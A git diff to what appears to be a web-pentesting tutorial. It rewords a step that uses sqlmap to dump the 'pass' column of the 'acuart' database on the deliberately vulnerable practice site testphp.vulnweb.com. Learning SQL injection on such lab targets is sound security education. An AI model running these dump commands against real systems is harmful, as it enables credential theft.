@@ -82,8 +82,7 @@ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --columns
 
 - Now you see we got columns of databases.
 
-- step 5 : Now we got data from pass columns.
-- Now follow this command for find data on pass columns.
+- step 5 : Retrieve data from the pass column using the following command.
 
 ```COMMAND
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -C pass  --dump
@@ -92,6 +91,7 @@ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -C pass  --d
 ![image](https://github.com/user-attachments/assets/be536d09-1175-4123-bec8-a4b488436316)
 
 - now you see we got the data from pass column.
+
 
 ***3. Insecurity authentication***
 #### i.unencrypted username and password
